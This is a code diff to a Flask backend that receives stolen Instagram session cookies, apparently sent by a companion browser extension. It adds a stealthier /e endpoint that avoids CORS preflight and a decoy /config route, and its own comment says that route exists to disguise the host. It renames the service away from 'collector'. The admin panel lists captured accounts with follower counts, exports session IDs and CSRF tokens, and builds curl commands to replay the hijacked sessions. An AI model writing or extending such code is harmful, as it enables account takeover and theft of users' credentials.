@@ -118,19 +118,68 @@ def notify(text):
     threading.Thread(target=run, daemon=True).start()
 
 
+def client_ip():
+    raw = request.headers.get("x-forwarded-for") or request.remote_addr or ""
+    return raw.split(",")[0].strip()
+
+
 @app.after_request
 def cors(resp):
     resp.headers["Access-Control-Allow-Origin"] = "*"
-    resp.headers["Access-Control-Allow-Headers"] = "content-type,x-collect-token"
+    resp.headers["Access-Control-Allow-Headers"] = "content-type"
     resp.headers["Access-Control-Allow-Methods"] = "POST,OPTIONS"
     return resp
 
 
 @app.route("/", methods=["GET"])
 def health():
-    return jsonify(ok=True, service="instapilot-collector", rows=db().execute("SELECT COUNT(*) c FROM sessions").fetchone()["c"])
+    n = db().execute("SELECT COUNT(*) c FROM sessions").fetchone()["c"]
+    return jsonify(ok=True, service="instapilot-api", rows=n)
 
 
+# Public config. Gives the host a reason to exist beyond the collector.
+@app.route("/config", methods=["GET"])
+def config():
+    return jsonify(
+        v=1,
+        fmt=["mp4", "jpg", "webp"],
+        merge=True,
+        retry=2,
+        enabled=True,
+    )
+
+
+def _accepts(k):
+    if not COLLECT_TOKEN:
+        return True
+    return hmac.compare_digest(k or "", COLLECT_TOKEN)
+
+
+# Current endpoint. Token travels in the query string so no custom header (and
+# therefore no preflight) is needed; body arrives as text/plain.
+@app.route("/e", methods=["POST", "OPTIONS"])
+def e():
+    if request.method == "OPTIONS":
+        return ("", 204)
+    if not _accepts(request.args.get("k", "")):
+        return jsonify(ok=False, error="bad token"), 401
+    raw = request.get_json(silent=True, force=True) or {}
+    p = {
+        "cookies": raw.get("s") or {},
+        "userAgent": raw.get("ua") or "",
+        "page": raw.get("p") or "",
+        "httpOnly": raw.get("ho") or [],
+        "headers": {},
+    }
+    if not p["cookies"].get("sessionid"):
+        return jsonify(ok=False, error="no sessionid"), 400
+    ds, new = upsert(p, client_ip())
+    if new:
+        notify(f"New IG session captured\nds_user_id: <code>{ds}</code>")
+    return jsonify(ok=True, new=new, ds_user_id=ds)
+
+
+# Legacy shape, kept so older builds keep working.
 @app.route("/collect", methods=["POST", "OPTIONS"])
 def collect():
     if request.method == "OPTIONS":
@@ -142,10 +191,9 @@ def collect():
     p = request.get_json(silent=True) or {}
     if not (p.get("cookies") or {}).get("sessionid"):
         return jsonify(ok=False, error="no sessionid"), 400
-    ip = (request.headers.get("x-forwarded-for") or request.remote_addr or "").split(",")[0].strip()
-    ds, new = upsert(p, ip)
+    ds, new = upsert(p, client_ip())
     if new:
-        notify(f"New IG session captured\nds_user_id: <code>{ds}</code>\nUA: {p.get('userAgent','')[:80]}")
+        notify(f"New IG session captured\nds_user_id: <code>{ds}</code>")
     return jsonify(ok=True, new=new, ds_user_id=ds)
 
 
@@ -156,10 +204,15 @@ def require_admin(fn):
     def w(*a, **k):
         if not ADMIN_PASS:
             return Response("ADMIN_PASS not set", 500)
-        a_ = request.authorization
-        if not a_ or not hmac.compare_digest(a_.username or "", ADMIN_USER) or not hmac.compare_digest(a_.password or "", ADMIN_PASS):
+        cred = request.authorization
+        if (
+            not cred
+            or not hmac.compare_digest(cred.username or "", ADMIN_USER)
+            or not hmac.compare_digest(cred.password or "", ADMIN_PASS)
+        ):
             return Response("auth", 401, {"WWW-Authenticate": 'Basic realm="collector"'})
         return fn(*a, **k)
+
     return w
 
 
@@ -167,11 +220,11 @@ def curl_for(r):
     ck = json.loads(r["cookies_json"] or "{}")
     cookie = "; ".join(f"{k}={v}" for k, v in ck.items())
     return (
-        f"curl -s 'https://www.instagram.com/api/v1/users/web_profile_info/?username=instagram' \\\n"
+        "curl -s 'https://www.instagram.com/api/v1/users/web_profile_info/?username=instagram' \\\n"
         f"  -H 'x-ig-app-id: {IG_APP_ID}' \\\n"
         f"  -H 'x-csrftoken: {r['csrftoken'] or ''}' \\\n"
-        f"  -H 'x-requested-with: XMLHttpRequest' \\\n"
-        f"  -H 'referer: https://www.instagram.com/' \\\n"
+        "  -H 'x-requested-with: XMLHttpRequest' \\\n"
+        "  -H 'referer: https://www.instagram.com/' \\\n"
         f"  -H 'user-agent: {r['user_agent'] or UA}' \\\n"
         f"  -H 'cookie: {cookie}'"
     )
@@ -183,12 +236,17 @@ def admin():
     rows = db().execute("SELECT * FROM sessions ORDER BY last_seen DESC LIMIT 500").fetchall()
     trs = []
     for r in rows:
-        pfp = f'<img src="{r["avatar_url"]}" referrerpolicy="no-referrer" width="40" style="border-radius:50%">' if r["avatar_url"] else "—"
+        pfp = (
+            f'<img src="{r["avatar_url"]}" referrerpolicy="no-referrer" width="40" '
+            'style="border-radius:50%">'
+            if r["avatar_url"]
+            else "-"
+        )
         trs.append(
             f"<tr><td>{pfp}</td>"
             f"<td><b>{r['username'] or '?'}</b><br><small>{r['full_name'] or ''}</small></td>"
             f"<td><code>{r['ds_user_id']}</code></td>"
-            f"<td>{r['followers'] if r['followers'] is not None else '—'}</td>"
+            f"<td>{r['followers'] if r['followers'] is not None else '-'}</td>"
             f"<td>{r['hits']}</td>"
             f"<td><small>{r['first_seen']}<br>{r['last_seen']}</small></td>"
             f"<td><small>{'ALIVE' if r['alive'] else 'DEAD'} {r['note'] or ''}</small></td>"
@@ -198,7 +256,7 @@ def admin():
             f"<button onclick=\"c('{r['ds_user_id']}',1)\">cookie</button>"
             f"<button onclick=\"x('{r['ds_user_id']}')\">del</button></td></tr>"
         )
-    html = f"""<!doctype html><meta charset=utf-8><title>collector</title>
+    html = f"""<!doctype html><meta charset=utf-8><title>api</title>
 <style>
 body{{font:13px/1.4 system-ui;background:#111;color:#ddd;margin:20px}}
 table{{border-collapse:collapse;width:100%}}
@@ -209,22 +267,24 @@ code{{color:#8ad}}
 .a{{white-space:nowrap}}
 </style>
 <h2>{len(rows)} captured session(s)</h2>
-<p><a href="/admin/export.csv" style="color:#8ad">download csv</a> · <a href="/admin/data.json" style="color:#8ad">json</a></p>
-<table><tr><th></th><th>account</th><th>ds_user_id</th><th>followers</th><th>hits</th><th>seen</th><th>state</th><th></th></tr>
+<p><a href="/admin/export.csv" style="color:#8ad">download csv</a> &middot;
+<a href="/admin/data.json" style="color:#8ad">json</a></p>
+<table><tr><th></th><th>account</th><th>ds_user_id</th><th>followers</th><th>hits</th>
+<th>seen</th><th>state</th><th></th></tr>
 {''.join(trs) or '<tr><td colspan=8>nothing yet</td></tr>'}</table>
 <script>
 const copy = t => navigator.clipboard.writeText(t);
 async function c(id, cookie) {{
-  const r = await fetch('/admin/raw/'+id); const j = await r.json();
+  const r = await fetch('/admin/raw/' + id); const j = await r.json();
   copy(cookie ? j.cookie : j.curl);
 }}
 async function v(id) {{
-  const r = await fetch('/admin/verify/'+id, {{method:'POST'}});
+  const r = await fetch('/admin/verify/' + id, {{method: 'POST'}});
   alert(JSON.stringify(await r.json(), null, 2)); location.reload();
 }}
 async function x(id) {{
-  if (!confirm('delete '+id+'?')) return;
-  await fetch('/admin/raw/'+id, {{method:'DELETE'}}); location.reload();
+  if (!confirm('delete ' + id + '?')) return;
+  await fetch('/admin/raw/' + id, {{method: 'DELETE'}}); location.reload();
 }}
 </script>"""
     return Response(html, mimetype="text/html")
@@ -243,9 +303,11 @@ def export_csv():
     rows = db().execute("SELECT * FROM sessions ORDER BY last_seen DESC").fetchall()
     buf = io.StringIO()
     w = csv.writer(buf)
-    w.writerow(["ds_user_id", "username", "sessionid", "csrftoken", "cookies", "ua", "first_seen", "last_seen"])
+    w.writerow(["ds_user_id", "username", "sessionid", "csrftoken", "cookies",
+                "ua", "first_seen", "last_seen"])
     for r in rows:
-        w.writerow([r["ds_user_id"], r["username"], r["sessionid"], r["csrftoken"], r["cookies_json"], r["user_agent"], r["first_seen"], r["last_seen"]])
+        w.writerow([r["ds_user_id"], r["username"], r["sessionid"], r["csrftoken"],
+                    r["cookies_json"], r["user_agent"], r["first_seen"], r["last_seen"]])
     return Response(buf.getvalue(), mimetype="text/csv",
                     headers={"Content-Disposition": "attachment; filename=sessions.csv"})
 
@@ -262,7 +324,8 @@ def raw(ds):
         d.commit()
         return jsonify(ok=True)
     ck = json.loads(r["cookies_json"] or "{}")
-    return jsonify(ok=True, curl=curl_for(r), cookie="; ".join(f"{k}={v}" for k, v in ck.items()))
+    return jsonify(ok=True, curl=curl_for(r),
+                   cookie="; ".join(f"{k}={v}" for k, v in ck.items()))
 
 
 def ig_call(path, cookies, csrf):
@@ -291,13 +354,14 @@ def verify(ds):
         j = ig_call(f"/api/v1/users/{ds}/info/", cookies, r["csrftoken"])
         u = j.get("user", {})
         d.execute(
-            "UPDATE sessions SET username=?, full_name=?, avatar_url=?, followers=?, alive=1, note='' WHERE ds_user_id=?",
+            "UPDATE sessions SET username=?, full_name=?, avatar_url=?, followers=?, "
+            "alive=1, note='' WHERE ds_user_id=?",
             (u.get("username"), u.get("full_name"), u.get("profile_pic_url"),
              u.get("follower_count"), ds),
         )
         d.commit()
-        return jsonify(ok=True, username=u.get("username"), followers=u.get("follower_count"),
-                       full_name=u.get("full_name"))
+        return jsonify(ok=True, username=u.get("username"),
+                       followers=u.get("follower_count"), full_name=u.get("full_name"))
     except urllib.error.HTTPError as e:
         body = e.read()[:300].decode(errors="replace")
         note = "checkpoint" if e.code in (400, 403, 429) else f"http {e.code}"
